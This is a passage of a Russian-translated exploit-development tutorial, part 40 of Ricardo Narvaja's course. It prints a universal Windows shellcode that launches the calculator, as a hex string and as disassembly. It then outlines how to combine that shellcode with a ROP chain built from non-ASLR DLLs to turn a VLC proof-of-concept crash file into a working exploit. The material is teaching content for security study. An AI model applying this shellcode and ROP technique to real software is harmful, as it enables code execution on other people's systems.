# Часть 40

 **УНИВЕРСАЛЬНЫЙ** **ШЕЛЛКОД**  
  
Существует тысячи типов шеллкодов. Каждый из них разработан в соответствии с целью, которую мы должны эксплуатировать.  
  
Существую шеллкоды, которые используются для доказательства того, что вы можете запустить код после эксплуатации. Обычно они запускают калькулятор и ничего больше.  
  
Очевидно, что существуют более сложные шеллкоды, которые открывают удаленные консоли, стараются остаться в системе не смотря на то, что эксплуатируемая программа перестает работать или закрывается, инжектируют себя в некоторый другой процесс системы, сохраняет себя как файл и т.д.  
  
Существует библиотека шеллкодов, которую мы можем найти в **GOOGLE** или запрограммировать, если нам нужно что-то особенное.  
  
С этого момента мы будем использовать **УНИВЕРСАЛЬНЫЙ** **ШЕЛЛКОД**, который работает для всех версией **WINDOWS** и запускает калькулятор. При этом мы продемонстрируем выполнение кода.  
  
Я нашел его здесь:  
  
[https://packetstormsecurity.com/fil...-Null-Free-CreateProcessA-Calc-Shellcode.html](https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html)  
  
shellcode=  
**"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b"\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"**  
  
Я могу использовать его в скрипте **PYTHON** точно так же, если у меня есть место для его добавления.  
  
Сами байты эксплоита такие:  
  
**31 db 64 8b 7b 30 8b 7f 0c 8b 7f 1c 8b 47 08 8b 77 20 8b 3f 80 7e 0c 33 75 f2 89 c7 03 78 3c 8b" 57 78 01 c2 8b 7a 20 01 c7 89 dd 8b 34 af 01 c6 45 81 3e 43 72 65 61 75 f2 81 7e 08 6f 63 65 73 75 e9 8b 7a 24 01 c7 66 8b 2c 6f 8b 7a 1c 01 c7 8b 7c af fc 01 c7 89 d9 b1 ff 53 e2 fd 68 63 61 6c 63 89 e2 52 52 53 53 53 53 53 53 52 53 ff d7**  
  
  
**MOV EDI,DWORD PTR FS:\[EBX+30\]  
XOR EBX,EBX  
MOV EDI,DWORD PTR DS:\[EDI+C\]  
MOV EDI,DWORD PTR DS:\[EDI+1C\]  
MOV EAX,DWORD PTR DS:\[EDI+8\]  
MOV ESI,DWORD PTR DS:\[EDI+20\]   
MOV EDI,DWORD PTR DS:\[EDI\]  
CMP BYTE PTR DS:\[ESI+C\],33  
JNZ SHORT CANARY\_c.00A7138A   
MOV EDI,EAX  
ADD EDI,DWORD PTR DS:\[EAX+3C\]  
MOV EDX,DWORD PTR DS:\[EDI+78\]  
ADD EDX,EAX  
MOV EDI,DWORD PTR DS:\[EDX+20\]  
ADD EDI,EAX  
MOV EBP,EBX   
MOV ESI,DWORD PTR DS:\[EDI+EBP\*4\]  
ADD ESI,EAX  
INC EBP  
CMP DWORD PTR DS:\[ESI\],61657243  
JNZ SHORT CANARY\_c.00A713A9  
CMP DWORD PTR DS:\[ESI+8\],7365636F  
JNZ SHORT CANARY\_c.00A713A9  
MOV EDI,DWORD PTR DS:\[EDX+24\]  
ADD EDI,EAX  
MOV BP,WORD PTR DS:\[EDI+EBP\*2\]  
MOV EDI,DWORD PTR DS:\[EDX+1C\]  
ADD EDI,EAX  
MOV EDI,DWORD PTR DS:\[EDI+EBP\*4-4\]  
ADD EDI,EAX  
MOV ECX,EBX  
MOV CL,0FF  
PUSH EBX  
LOOPD SHORT CANARY\_c.00A713D8  
PUSH 636C6163  
MOV EDX,ESP  
PUSH EDX  
PUSH EDX  
PUSH EBX  
PUSH EBX  
PUSH EBX  
PUSH EBX  
PUSH EBX  
PUSH EBX  
PUSH EDX  
PUSH EBX  
CALL EDI**  
  
Эти байты запускают калькулятор везде где мы их вставляем. Хорошо, что у этих байтов нет нулей. Хотя могут быть программы, который отвергают какой-то конкретный символ отличный от нуля. Это будет зависеть от случая.  
  
Мы уже знаем, как сделать **ROP** и у нас уже есть универсальный шеллкод. Основной смысл состоит в том, чтобы практиковаться с программой **VLC**, для которой мы уже сделали **POC**. Я был бы очень рад, если бы кто-то отправил мне полный файл и туториал, объясняющий то, что Вы сделали. Я бы добавил бы первого человека, который отправил бы мне хорошо объясняющий туториал в качестве приложения в одной из глав.  
  
**ROP** может быть сделан вручную или с помощью **MONA**. Для нас нет никаких проблем. Вы должны найти модуль **DLL** без защиты **ASLR** и если таких больше чем один, **MONA** может использовать больше одной **DLL** в качестве аргумента, для объединения **ROP** объединяющей обе **DLL**.  
  
Что касается же скрипта **PYTHON**, то я дам вам его схему. Как только вы создадите **ROP**, откройте файл **POC.TY+**  
  
![1.png](https://wasm.in/attachments/1-png.3004/)   
  
И ищите числа **41424344**, которые перезаписывают **АДРЕС** **ВОЗВРАТА**.  
  
![2.png](https://wasm.in/attachments/2-png.3005/)   
  
И здесь, в зависимости от размера **ROP** + **ШЕЛЛКОДА,** скажем, что в качестве примера, **ROP** и **ШЕЛЛКОД** имеет длину **150** байтов. Я заменяю область по чуть-чуть начиная со значения **41424344**включительно. Предположим что это **160** байтов.  
  
Я помечаю вниз, пока не получу отмеченную область требуемой длины.  
  
![3.png](https://wasm.in/attachments/3-png.3006/)   
  
Я заполняю выбранную область с помощью байта **90**.  
  
![4.png](https://wasm.in/attachments/4-png.3007/)   
  
Хорошо, проверьте размер области, где находятся байты **90**, которая больше чем размер **ROP** + **ШЕЛЛКОД**. Я записываю полученный размер. В моём случае он равен **160** байт.  
  
![5.png](https://wasm.in/attachments/5-png.3008/)   
  
Теперь у нас есть схема работы скрипта. Скрипт ещё не протестирован. Скрипт не работает. Мы не определили **ROP** или **ШЕЛЛКОД**. Вы можете использовать **УНИВЕРСАЛЬНЫЙ** **ШЕЛЛКОД**, который мы только что видели, если у вас нет проблем с каким-либо символом. Если это не так, вы должны найти другой шеллкод.  
  
Основная идея состоит в том, что скрипт открывает файл заполненный байтами **90**, заменяет их полезной нагрузкой того же размера, которая содержит начало **ROP,** **ШЕЛЛКОД** и дополнительные данные или заполнение. Затем скрипт сохраняет файл, чтобы проверить его работоспособность. Если файл заработает, то это будет считаться эксплоитом. А если нет заработает, нам нужно трассировать, чтобы увидеть почему так получилось.  
  
Я был бы очень рад, если бы кто-то написал туториал и отправил мне рабочий эксплоит.Я бы увидел, что я зря не тратил время на написание туториалов.  
  
Первый человек, который отправит мне туториал, будет добавлен в наш курс как победитель. Если людей будет больше одного, я загружу решению их в папку **SOLUCIONES** нашего курса, которую я создам для этого на своев Веб-Сервере, если это потребуется.  
  
До следующей части **41**. Практикуйте и находите решение.  
  
  
**=======================================================  
Автор текста: Рикардо Нарваха** - **Ricardo** **Narvaja** \(**@ricnar456**\)  
Перевод на английский: **IvinsonCLS \(@IvinsonCLS\)**  
Перевод на русский с испанского+английского: **Яша\_Добрый\_Хакер\(Ростовский фанат Нарвахи\).**  
Перевод специально для форума системного и низкоуровневого программирования — **WASM.IN  
11.04.2018  
Версия 1.0**

